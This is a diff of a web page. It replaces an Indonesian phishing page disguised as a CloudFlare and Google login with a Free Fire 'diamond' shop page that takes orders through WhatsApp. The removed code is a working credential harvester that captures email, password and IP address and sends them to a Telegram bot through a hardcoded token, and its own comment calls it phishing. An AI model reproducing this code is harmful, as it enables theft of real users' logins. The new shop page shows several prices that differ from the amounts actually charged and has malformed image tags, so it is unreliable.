@@ -1,116 +1,196 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CloudFlare</title>
-<style>
-  body {
-      background-image: url('https://files.catbox.moe/qm1fqn.jpeg');
-      background-size: cover;
-      background-position: center;
-      color: #fff;
-      font-family: Arial, sans-serif;
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Diamond Free Fire Store</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
+  <style>
+    * {
       margin: 0;
       padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      box-sizing: border-box;
+      font-family: 'Orbitron', sans-serif;
     }
-    .container {
-      background-color: rgba(0, 0, 0, 0.7);
+    body {
+      background: url('https://files.catbox.moe/2qy5lg.jpeg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
       padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px #00f;
-      width: 300px;
+      animation: bgAnim 60s infinite linear;
+    }
+    @keyframes bgAnim {
+      0% { filter: hue-rotate(0deg); }
+      100% { filter: hue-rotate(360deg); }
     }
     h1 {
       text-align: center;
-      color: #0ff;
+      margin-bottom: 40px;
+      text-shadow: 2px 2px 8px #000;
     }
-    p {
-      text-align: center;
-      font-size: 14px;
+    .container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      justify-content: center;
     }
-    input, button {
+    .card {
+      background: rgba(0, 0, 0, 0.6);
+      border: 2px solid #00f2ff;
+      border-radius: 15px;
+      padding: 20px;
+      width: 250px;
+      box-shadow: 0 0 20px #00f2ff;
+      transition: transform 0.3s ease;
+    }
+    .card:hover {
+      transform: scale(1.05);
+    }
+    .card img {
+      width: 100%;
+      border-radius: 10px;
+    }
+    .card h3 {
+      margin-top: 10px;
+    }
+    .card button {
+      margin-top: 10px;
       width: 100%;
       padding: 10px;
-      margin: 10px 0;
       border: none;
-      border-radius: 5px;
-      background-color: #333;
-      color: #fff;
-    }
-    button {
-      background-color: #00f;
+      background: #00f2ff;
+      color: #000;
+      font-weight: bold;
       cursor: pointer;
-      transition: 0.3s;
+      border-radius: 8px;
+      transition: background 0.3s ease;
     }
-    button:hover {
-      background-color: #00ff00;
+    .card button:hover {
+      background: #00d6e0;
+    }
+    .form-input {
+      margin-top: 10px;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background: #222;
+      color: white;
     }
   </style>
 </head>
 <body>
+  <h1>🔥 Diamond Free Fire Shop 🔥</h1>
   <div class="container">
-    <h1>Selamat Datang</h1>
-    <p>Silakan daftar atau masuk untuk mengakses Shop.</p>
-    <form id="loginForm">
-      <input type="email" id="email" placeholder="Email atau Gmail" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <button type="button" onclick="loginWithGoogle()">Login with Google</button>
-      <button type="submit">Masuk Sekarang</button>
-    </form>
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg" alt="50 Diamonds">
+      <h3>50 Diamonds</h3>
+      <p>Harga: Rp7.500</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name50">
+      <button onclick="buy('50 Diamonds', 7500, 'name50')">Buy</button>
+    </div>
+    
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg" alt="70 Diamonds">
+      <h3>70 Diamonds</h3>
+      <p>Harga: Rp10.00</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name70">
+      <button onclick="buy('70 Diamonds', 1000, 'name70')">Buy</button>
+    </div>
+    
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg" alt="100 Diamonds">
+      <h3>100 Diamonds</h3>
+      <p>Harga: Rp14.000</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name100">
+      <button onclick="buy('100 Diamonds', 14000, 'name100')">Buy</button>
+    </div>
+    
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg" alt="140 Diamonds">
+      <h3>140 Diamonds</h3>
+      <p>Harga: Rp19.000</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name140">
+      <button onclick="buy('140 Diamonds', 19000, 'name140')">Buy</button>
+    </div>
+    
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg" alt="210 Diamonds">
+      <h3>210 Diamonds</h3>
+      <p>Harga: Rp28.000</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name210">
+      <button onclick="buy('210 Diamonds', 28000, 'name210')">Buy</button>
+    </div>
+    
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg"= alt="300 Diamonds">
+      <h3>300 Diamonds</h3>
+      <p>Harga: Rp40.000</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name300">
+      <button onclick="buy('300 Diamonds', 40000, 'name300')">Buy</button>
+    </div>
+    
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg"= alt="355 Diamonds">
+      <h3>355 Diamonds</h3>
+      <p>Harga: Rp47.000</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name355">
+      <button onclick="buy('355 Diamonds', 47000, 'name355')">Buy</button>
+    </div>
+    
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg"= alt="500 Diamonds">
+      <h3>500 Diamonds</h3>
+      <p>Harga: Rp67.000</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name500">
+      <button onclick="buy('500 Diamonds', 65500, 'name500')">Buy</button>
+    </div>
+    
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg"= alt="720 Diamonds">
+      <h3>720 Diamonds</h3>
+      <p>Harga: Rp90.500</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name720">
+      <button onclick="buy('720 Diamonds', 90500, 'name720')">Buy</button>
+    </div>
+    
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg"= alt="1000 Diamonds">
+      <h3>1000 Diamonds</h3>
+      <p>Harga: Rp129.000</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name1000">
+      <button onclick="buy('1000 Diamonds', 129000, 'name1000')">Buy</button>
+    </div>
+    
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg"= alt="1450 Diamonds">
+      <h3>1450 Diamonds</h3>
+      <p>Harga: Rp200.000</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name1450">
+      <button onclick="buy('1450 Diamonds', 200000, 'name1450')">Buy</button>
+    </div>
+    
+    <div class="card">
+      <img src="https://files.catbox.moe/qm1fqn.jpeg"= alt="7290 Diamonds">
+      <h3>7290 Diamonds</h3>
+      <p>Harga: Rp950.000</p>
+      <input type="text" class="form-input" placeholder="Nama kamu" id="name7290">
+      <button onclick="buy('7290 Diamonds', 950000, 'name7290')">Buy</button>
+    </div>
+    
   </div>
-
-<script>
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-event.preventDefault();
-const email = document.getElementById('email').value;
-const password = document.getElementById('password').value;
-
-// Dapatkan IP address dari layanan eksternal
-fetch('https://api.ipify.org?format=json')
-.then(response => response.json())
-.then(data => {
-const ipAddress = data.ip;
-kirimKeTelegram(email, password, ipAddress);
-})
-.catch(error => console.error('Gagal mendapatkan IP:', error));
-});
-
-function loginWithGoogle() {
-// Ini hanya memicu form yang sama, sebagai phishing
-alert('Anda akan login dengan Google. Masukkan detail Anda di bawah.');
-// Form akan tetap digunakan untuk mengumpulkan data
-}
-
-function kirimKeTelegram(email, password, ipAddress) {
-const token = '7506021552:AAGeMOdzFtnc9lgrbiDfJbtQ1b5yxYryMxw'; // Ganti dengan token bot Anda
-const chatId = '8082614610'; // Ganti dengan chat ID Anda
-const message = `Email/Gmail: ${email}\nPassword: ${password}\nIP Address: ${ipAddress}`;
-
-fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-method: 'POST',
-headers: {
-'Content-Type': 'application/json'
-},
-body: JSON.stringify({
-chat_id: chatId,
-text: message
-})
-})
-.then(response => response.json())
-.then(data => {
-if (data.ok) {
-window.location.href = 'https://website-all-produk-lightsecret.vercel.app'; // Redirect setelah berhasil
-} else {
-console.error('Gagal mengirim ke Telegram:', data);
-}
-})
-.catch(error => console.error('Error:', error));
-}
-</script>
+  <script>
+    function buy(product, price, nameId) {
+      const name = document.getElementById(nameId).value;
+      if (!name) {
+        alert('Masukkan nama kamu dulu!');
+        return;
+      }
+      const message = `Halo! Saya ingin membeli *${product}* dengan harga *Rp${price.toLocaleString()}*.\nNama saya: *${name}*`;
+      const phone = '6283832091336'; // Ganti dengan nomormu
+      const url = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
+      window.open(url, '_blank');
+    }
+  </script>
 </body>
 </html>
